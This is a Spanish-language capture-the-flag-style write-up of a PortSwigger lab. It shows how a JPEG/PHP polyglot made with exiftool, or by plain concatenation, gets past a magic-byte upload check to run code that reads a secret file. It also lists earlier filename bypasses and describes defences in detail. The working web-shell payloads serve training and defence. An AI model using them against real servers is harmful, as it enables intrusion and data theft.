# Writeup: Remote code execution via polyglot web shell upload (PortSwigger)

- **Lab**: Remote code execution via polyglot web shell upload
- **URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
- **Categoría**: File upload / Polyglot / Magic bytes bypass / Web shell / RCE
- **Dificultad**: Practitioner
- **Credenciales**: `wiener:peter`

---

## 1. Objetivo

Mismo target (`/home/carlos/secret`), mismo endpoint (`/my-account/avatar`). La defensa: **validación de magic bytes** del contenido del archivo. Cierra todos los bypasses anteriores del cluster (Content-Type del part, obfuscación del filename, `.htaccess`) — el server no se fija solo en el filename, mira los primeros bytes del archivo. Si no son `FF D8 FF` (JPEG) o `89 50 4E 47` (PNG), rechaza.

Bypass: **polyglot** — un archivo que es válido como **dos formatos a la vez**. Empieza con magic bytes de JPEG (pasa la validación) y contiene código PHP en algún punto del archivo (Apache lo ejecuta cuando procesa la extensión `.php`).

Construcción del polyglot:

```bash
exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' \
         input.jpg -o polyglot.php
```

Esto inyecta el PHP en el campo `Comment` de los metadatos EXIF. El archivo sigue siendo JPEG válido (magic bytes intactos), pero contiene el bloque `<?php ... ?>` que Apache va a ejecutar.

Subir `polyglot.php` vía `/my-account/avatar`. Sin necesidad de tocar Content-Type — el archivo ES JPEG válido. Después navegar a `/files/avatars/polyglot.php`. Body de la response: bytes binarios del JPEG **+** el output del PHP (el secret) intercalado.

### Insight central

**Polyglot explota que la validación y la ejecución miran cosas distintas del mismo archivo**: la validación lee los primeros bytes (magic bytes) y aprueba si son de imagen; Apache (al procesar `.php`) lee el archivo completo y ejecuta cualquier `<?php ... ?>` que encuentre, ignorando todo lo demás como output literal. Las dos lecturas son consistentes con el archivo — uno lo lee como imagen y "acierta", el otro lo lee como PHP y "acierta". El bug está en asumir que el formato del archivo es único. Defensa correcta: re-encodear/normalizar la imagen server-side, lo cual destruye los metadatos EXIF y el código PHP en ellos.

---

## 2. Recon y resolución

### 2.1 Diagnosticar la nueva defensa

Login `wiener:peter`. Probar todos los bypasses de los labs anteriores:

- `exploit.php` con `Content-Type: image/jpeg` → rechazado.
- `exploit.php%00.jpg` (null byte) → rechazado.
- `.htaccess` con `AddType` → rechazado o sin efecto.
- `..%2fexploit.php` (path traversal) → rechazado.

Todos los bypasses anteriores fallan. La defensa nueva mira el contenido real del archivo, no el filename ni el Content-Type. Probable implementación:

```php
$mime = mime_content_type($_FILES['avatar']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die("File type not allowed");
}
```

`mime_content_type` lee los primeros bytes (magic bytes) del archivo y deriva el tipo. Un PHP raw no empieza con `FF D8 FF` ni `89 50 4E 47` — la validación rechaza.

### 2.2 Construir el polyglot

Necesitamos un archivo que:
1. Empiece con magic bytes de JPEG (`FF D8 FF E0` o `FF D8 FF E1`).
2. Contenga `<?php ... ?>` en algún punto del archivo.

Dos formas:

**Método A — `exiftool` (limpio)**:

```bash
exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' \
         input.jpg -o polyglot.php
```

`exiftool` modifica el campo `Comment` de los metadatos EXIF de `input.jpg` y escribe el resultado en `polyglot.php`. La estructura del JPEG queda intacta — los magic bytes al principio, los marcadores SOI/EOI correctos, el código PHP en el segmento APP1 (EXIF) o COM (comment).

Instalar exiftool en Ubuntu: `sudo apt install -y libimage-exiftool-perl`.

> Nota operacional: el flag `-o` requiere que el archivo destino no exista. Si re-ejecutás el comando, eliminá `polyglot.php` primero o usá `-overwrite_original_in_place` sin `-o`.

**Método B — concatenación cruda**:

```bash
cp input.jpg polyglot.php
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' >> polyglot.php
```

Más simple, pero técnicamente el archivo resultante deja de ser JPEG estrictamente válido (hay bytes después del marcador EOI). En la práctica `mime_content_type` solo mira los primeros bytes — el método B suele pasar igual. exiftool es más robusto si la validación es más estricta.

### 2.3 Subir y ejecutar

Upload via `/my-account/avatar` sin tocar nada más. El archivo pasa la validación de magic bytes (los primeros bytes son JPEG). Server responde 200 OK.

Navegar a `/files/avatars/polyglot.php`. Body de la response:

```
<bytes binarios del JPEG>
...JFIF...EXIF data...
[mucha basura binaria]
<aquí está el secret porque echo lo printeó>
<resto de bytes del JPEG>
```

Buscar el secret entre la basura. Pista: no son chars binarios, es texto ASCII visible. En el screenshot del lab se ve mezclado con los bytes del JPEG — copiando todo a un editor y filtrando ASCII printable se aísla el secret. Submit → lab solved.

---

## 3. Por qué funciona

### 3.1 Anatomía del bug

```php
// Antipatron - magic bytes pero sin re-encoding
$mime = mime_content_type($_FILES['avatar']['tmp_name']);  // Aplica reglas libmagic sobre el header
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die("File type not allowed");
}

// Filename sigue siendo del cliente
move_uploaded_file($_FILES['avatar']['tmp_name'], '/var/www/files/avatars/' . $_FILES['avatar']['name']);
```

Tres componentes:

1. **`mime_content_type` aplica reglas de libmagic basadas en magic bytes y heurísticas**: prioriza los bytes del header (`FF D8 FF` para JPEG, `89 50 4E 47` para PNG) pero puede leer más profundo según la regla. En la práctica, para formatos comunes el header alcanza y los bytes posteriores no afectan la decisión. Un archivo que empieza con header JPEG y contiene PHP en metadata después es "image/jpeg" según esta función.
2. **El archivo se guarda intacto**: `move_uploaded_file` escribe el archivo tal cual está, sin normalizarlo. Los bytes posteriores al header (incluyendo el `<?php>`) quedan en el archivo final.
3. **Apache procesa la extensión `.php` parsing el archivo entero**: cuando alguien navega a `/files/avatars/polyglot.php`, Apache ve la extensión `.php`, invoca el motor PHP. PHP parsea el archivo completo buscando `<?php ... ?>`. Encuentra el bloque entre los bytes del JPEG, lo ejecuta. El resto del archivo (header JPEG, basura) se imprime literal.

El bug está en la asunción **"si los magic bytes son de imagen, el archivo es solo imagen"**. La realidad: un archivo puede contener múltiples formatos válidos simultáneamente. PHP no pierde el bloque `<?php>` porque haya bytes binarios alrededor — específicamente diseñado para soportar HTML+PHP intercalados.

### 3.2 Anatomía del polyglot

Un JPEG válido tiene esta estructura:

```
FF D8 FF E0    <- SOI (Start of Image) + APP0 marker
... metadata APP0 ...
FF E1          <- APP1 marker (donde van los EXIF metadata)
... datos EXIF, incluyendo el campo Comment ...
... más segmentos opcionales ...
FF DA          <- SOS (Start of Scan) - aquí empieza la imagen
... pixel data comprimida ...
FF D9          <- EOI (End of Image)
```

`exiftool -Comment='<?php ...'` mete el string PHP dentro del segmento APP1 EXIF. La estructura JPEG queda intacta:

- `mime_content_type` mira los primeros bytes → `FF D8 FF` → "image/jpeg". Aprueba.
- Apache invoca PHP con `polyglot.php` → PHP parsea bytes secuenciales.
- PHP ignora bytes que no son código (los trata como output literal — modo "template").
- Cuando encuentra `<?php`, entra a modo de ejecución hasta `?>`.
- Ejecuta el `echo file_get_contents(...)`, agrega el secret al output.
- Sale del bloque, sigue tratando el resto del archivo como output literal.

El cliente recibe: `<bytes JPEG hasta el comment> + <secret> + <bytes JPEG después>`. Todo en un solo response body.

### 3.3 ¿Por qué la concatenación cruda también funciona usualmente?

```bash
cat input.jpg shell.php > polyglot.php
```

Este archivo no es JPEG estrictamente válido — los bytes después del marcador `FF D9` (EOI) son inválidos según la spec. Pero:

- `mime_content_type` decide el tipo desde el header (libmagic prioriza magic bytes iniciales); los bytes posteriores al header no afectan la decisión para formatos comunes.
- Image viewers usualmente paran de leer en EOI; los bytes posteriores son ignorados.
- PHP parsea el archivo entero secuencialmente; encuentra el `<?php>` después del EOI y lo ejecuta.

Resultado: pasa la validación de magic bytes y ejecuta el PHP. Es por esto que tools como `cat image.jpg shell.php > polyglot.php` son el "low-effort polyglot" que funciona contra defensas comunes.

Defensas más estrictas (que validan estructura JPEG completa, ej. `getimagesize()` que parsea el header de pixel data) pueden detectar el polyglot crudo. Para esos, exiftool con metadata es más sigiloso porque mantiene la estructura JPEG válida.

### 3.4 Variantes de polyglots

Polyglots son una clase amplia de archivos. Algunos ejemplos:

- **JPEG + PHP**: este lab.
- **PNG + PHP**: igual idea, magic bytes PNG (`89 50 4E 47`) + PHP en chunk de metadata (`tEXt`).
- **GIF + JavaScript**: `GIF89a;<script>...</script>` — el `;` es un trailer GIF válido, todo lo siguiente es output ignorado por image viewers pero ejecutado por browsers que sirven el archivo como `text/html`.
- **PDF + ZIP** (polyglot infame): un archivo que es PDF válido y a la vez ZIP válido. Header PDF al principio + central directory de ZIP al final (ZIP busca el directory desde el final).
- **PDF + JPEG + JavaScript** (triple polyglot): construible con cuidado, usado en CTFs.
- **JAR + ZIP** (cualquier JAR es ZIP, es trivial). Por eso JARs pueden ocultar contenido como ZIPs.

El recurso de referencia es Ange Albertini ("Funky File Formats"): catálogo extensivo de polyglots viables, desde simples hasta absurdos.

### 3.5 ¿Por qué este lab es Practitioner?

A diferencia de los labs anteriores donde el bypass era un cambio en el filename o Content-Type, este requiere:

- Conocimiento de qué son magic bytes y cómo funcionan los detectores de tipo.
- Conocimiento de la estructura interna del formato JPEG (o capacidad de buscar la receta).
- Tooling adicional (exiftool) o entender que la concatenación cruda funciona.
- Mental model de "un archivo puede ser dos cosas a la vez".

Es el primer lab del cluster donde el atacante necesita conocimiento del formato del archivo, no solo del input handling.

### 3.6 Defensa correcta

```php
// Fix - re-encodear la imagen server-side
$tmp = $_FILES['avatar']['tmp_name'];

// 1. Validar magic bytes (defensa rápida)
$mime = mime_content_type($tmp);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die("File type not allowed");
}

// 2. Cargar la imagen con una librería que parsea el formato real
$img = ($mime === 'image/jpeg') ? imagecreatefromjpeg($tmp) : imagecreatefrompng($tmp);
if (!$img) {
    die("Invalid image");
}

// 3. Re-encodear y guardar - destruye metadata, EXIF, segmentos extra, polyglots
$new_name = bin2hex(random_bytes(16)) . '.jpg';
$dest = '/var/www/files/avatars/' . $new_name;
imagejpeg($img, $dest, 85);  // Re-encoding al 85% calidad
imagedestroy($img);
```

El paso clave es **re-encodear**: cargar la imagen con una librería que parsea el formato (GD, ImageMagick, Pillow), convertir a una representación interna (bitmap), y re-escribir como JPEG/PNG nuevo. Este proceso:

- Descarta segmentos no-imagen (EXIF metadata, comentarios, polyglot bytes).
- Elimina cualquier código embebido.
- Produce un archivo que es estrictamente JPEG/PNG válido y solo eso.

Limitaciones: re-encoding es CPU-intensive y reduce calidad. Para uso normal (avatares, thumbnails) es aceptable. Para casos donde se necesita preservar el archivo original (fotografía profesional con metadata RAW), hay que aplicar otras estrategias (almacenar fuera del document root + servir vía endpoint dedicado que setea Content-Type explícito).

5 capas:
1. **Whitelist + magic bytes** (validación rápida).
2. **Re-encoding** server-side (la defensa estructural contra polyglots).
3. **Filename server-controlled** (rename a UUID).
4. **Almacenar fuera del document root** o en directorio sin ejecución.
5. **Mínimo privilegio** del proceso.

### 3.7 Patrón estructural común con los labs anteriores del cluster

| Lab | Defensa | Bypass | Asunción rota |
|---|---|---|---|
| `rce-via-web-shell-upload` | ninguna | `exploit.php` | (no hay defensa) |
| `content-type-restriction-bypass` | Content-Type del part | header → `image/jpeg` | "Content-Type cliente = tipo real" |
| `path-traversal` | strip `../` + dir sin scripts | `..%2f` | "filename = nombre, no path" |
| `extension-blacklist-bypass` | blacklist PHP | `.htaccess` + `.l33t` | "extensiones ejecutables son fijas" |
| `obfuscated-file-extension` | blacklist + `.htaccess` blocked | `exploit.php%00.jpg` | "validar string = validar path final" |
| **`polyglot-web-shell` (este)** | magic bytes del contenido | JPEG con PHP en EXIF | "magic bytes del header = formato único del archivo" |

6 asunciones rotas, cada una más sofisticada. La progresión del cluster muestra cómo cada defensa nueva introduce una asunción nueva, y cómo el atacante encuentra el ángulo que la rompe. La defensa estructuralmente correcta es la combinación de las 5 capas — no una sola capa, porque cada una tiene un bypass específico.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Probar bypasses anteriores - todos fallan]
    B[2. Diagnostico: validacion de magic bytes]
    C[3. Idea: polyglot JPEG+PHP]
    D[4. exiftool inyecta PHP en EXIF Comment]
    E[5. Subir polyglot.php - magic bytes pasan validacion]
    F[6. GET /files/avatars/polyglot.php]
    G[7. Apache parsea archivo, ejecuta &lt;?php ... ?&gt;]
    H[8. Body = bytes JPEG + secret intercalado]
    I[9. Submit secret - lab solved]

    A --> B --> C --> D --> E --> F --> G --> H --> I
```



Tres ideas:

1. **Polyglot rompe la asunción "un archivo, un formato"**: un archivo puede contener múltiples formatos válidos simultáneamente. La validación lo lee como imagen y "acierta"; Apache lo lee como PHP y "acierta". Las dos lecturas son consistentes con el archivo; el bug está en asumir formato único.
2. **Magic bytes solos no detectan polyglots**: la validación mira los primeros bytes; el polyglot tiene esos bytes correctos. La defensa correcta es **re-encodear server-side** — cargar la imagen, descartar metadata/segmentos extra, re-escribir como formato puro. Destruye polyglots por construcción.
3. **exiftool en EXIF Comment es el polyglot canónico para JPEG+PHP**: mantiene la estructura JPEG estrictamente válida (`mime_content_type`, image viewers, `getimagesize` todos lo aceptan como JPEG normal). Más robusto que concatenación cruda contra defensas que validan estructura completa.

---

## 5. Contramedidas

1. **Re-encodear imágenes server-side**: la defensa estructural contra polyglots. `imagecreatefromjpeg()` + `imagejpeg()` (PHP), `Image.open().save()` (Python Pillow), `ImageIO.read()` + `ImageIO.write()` (Java). Descarta toda metadata, segmentos extra, código embebido.
2. **Filename server-controlled**: rename a UUID. Cierra todas las obfuscaciones de filename.
3. **Whitelist de extensiones + magic bytes**: defensa rápida que rechaza la mayoría de uploads maliciosos antes del re-encoding caro.
4. **Almacenar uploads fuera del document root**: servir vía endpoint dedicado que setea Content-Type explícito y nunca permite que el web server interprete el contenido.
5. **Si no se puede re-encodear** (preservar metadata, fotografía profesional): forzar Content-Type estricto al servir y headers `X-Content-Type-Options: nosniff` para evitar que browsers infieran tipos.
6. **Deshabilitar ejecución de scripts en TODO el árbol de uploads**: `php_flag engine off` + `Options -ExecCGI` + `AddType text/plain .php .phtml ...`. Aunque el polyglot pase, no se ejecuta.
7. **Tests automatizados con polyglots conocidos**: por cada endpoint que acepte uploads, archivos generados con `exiftool -Comment='<?php phpinfo(); ?>'`, GIF+JS, PNG+PHP en `tEXt` chunk, PDF+ZIP. Cualquier ejecución/render inesperado es bug.
8. **Code review checklist**: cualquier `mime_content_type`/`mime_type` seguido de `move_uploaded_file` sin re-encoding intermedio es candidato a bug. Marcar.
9. **Mínimo privilegio**: el proceso del web server no debe poder leer fuera del directorio de assets. Limita el daño si el polyglot funciona.
10. **Antivirus/yara con reglas de polyglot**: stacks corporativos pueden tener detectores que identifican estructuras polyglot conocidas. Defensa-en-profundidad, no primaria.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Remote code execution via polyglot web shell upload*. https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
- PortSwigger Web Security Academy. (s.f.). *File upload vulnerabilities*. https://portswigger.net/web-security/file-upload
- ExifTool. (s.f.). *ExifTool by Phil Harvey*. https://exiftool.org/
- Albertini, A. (s.f.). *Funky File Formats*. https://www.youtube.com/watch?v=hdCs6bPM4is
- Albertini, A. (s.f.). *Corkami — Pocket reference for file format internals*. https://github.com/corkami/docs
- OWASP Foundation. (s.f.). *Unrestricted File Upload*. https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP Foundation. (s.f.). *File Upload Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
- MITRE Corporation. (2024). *CWE-345: Insufficient Verification of Data Authenticity*. https://cwe.mitre.org/data/definitions/345.html
- MITRE Corporation. (2024). *CWE-646: Reliance on File Name or Extension of Externally-Supplied File*. https://cwe.mitre.org/data/definitions/646.html
- MITRE Corporation. (2024). *ATT&CK Technique T1505.003: Server Software Component — Web Shell*. https://attack.mitre.org/techniques/T1505/003/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Upload Insecure Files*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 10 (Attacking Back-End Components — File Upload Vulnerabilities).
- Inventario interno: [`inventario/04-explotacion/web/explotacion-fileupload.md`](../../../inventario/04-explotacion/web/explotacion-fileupload.md)
- Labs hermanos del cluster:
  - [`learning/portswigger/file-upload-rce-via-web-shell-upload/writeup.md`](../file-upload-rce-via-web-shell-upload/writeup.md)
  - [`learning/portswigger/file-upload-content-type-restriction-bypass/writeup.md`](../file-upload-content-type-restriction-bypass/writeup.md)
  - [`learning/portswigger/file-upload-path-traversal/writeup.md`](../file-upload-path-traversal/writeup.md)
  - [`learning/portswigger/file-upload-extension-blacklist-bypass/writeup.md`](../file-upload-extension-blacklist-bypass/writeup.md)
  - [`learning/portswigger/file-upload-obfuscated-file-extension/writeup.md`](../file-upload-obfuscated-file-extension/writeup.md)
